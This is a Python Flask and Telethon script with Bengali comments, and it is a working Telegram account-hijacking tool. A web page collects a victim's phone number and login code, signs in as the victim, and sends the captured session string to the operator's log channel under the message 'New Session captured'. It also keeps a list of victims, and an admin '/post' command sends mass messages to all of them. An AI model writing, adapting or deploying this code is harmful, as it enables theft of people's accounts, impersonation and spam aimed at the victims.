import os
import asyncio
from flask import Flask, request, jsonify, send_from_directory
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__, static_url_path='')

# এনভায়রনমেন্ট ভ্যারিয়েবল লোড
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
LOG_CHANNEL = int(os.getenv("LOG_CHANNEL"))
ADMIN_ID = int(os.getenv("ADMIN_ID"))

# সেশন এবং ইউজার লিস্ট স্টোর
user_sessions = {}
all_users = set() # ব্রডকাস্টের জন্য ইউজার আইডি সেভ রাখা

client = TelegramClient(StringSession(), API_ID, API_HASH)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# ওয়েবসাইট থেকে ওটিপি রিকোয়েস্ট পাঠানো
@app.route('/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        user_sessions[phone] = {'hash': sent_code.phone_code_hash}
        return jsonify({"status": "sent"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

# ওটিপি ভেরিফাই ও সেশন ক্যাপচার
@app.route('/verify_otp', methods=['POST'])
async def verify_otp():
    data = request.json
    phone = data.get('phone')
    otp = data.get('otp')
    if phone in user_sessions:
        try:
            user = await client.sign_in(phone, otp, phone_code_hash=user_sessions[phone]['hash'])
            all_users.add(user.id) # ইউজারকে ব্রডকাস্ট লিস্টে যোগ করা
            session_str = client.session.save()
            
            # আপনার লগ চ্যানেলে সেশন পাঠানো
            await client.send_message(LOG_CHANNEL, f"✅ New Session captured:\nPhone: {phone}\n\n`{session_str}`")
            return jsonify({"status": "success"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 400
    return jsonify({"status": "error"}), 404

# --- অ্যাডমিন ব্রডকাস্ট সেকশন ---
@client.on(events.NewMessage(pattern='/post'))
async def broadcast_handler(event):
    if event.sender_id != ADMIN_ID:
        return # শুধু অ্যাডমিন মেসেজ দিতে পারবে

    # কমান্ড ফরম্যাট: /post আপনার নোটিশ এখানে
    notice_text = event.raw_text.replace('/post', '').strip()
    
    if not notice_text:
        await event.reply("⚠️ ব্যবহারের নিয়ম: `/post আপনার নোটিশ বা নতুন লিংক`")
        return

    count = 0
    await event.reply("⏳ নোটিশ পাঠানো শুরু হয়েছে...")
    
    for user_id in all_users:
        try:
            await client.send_message(user_id, notice_text)
            count += 1
            await asyncio.sleep(0.5) # ব্যান এড়াতে বিরতি
        except:
            continue

    await event.reply(f"📢 সফলভাবে {count} জন ইউজারকে নোটিশ পাঠানো হয়েছে।")

if __name__ == "__main__":
    client.start()
    app.run()
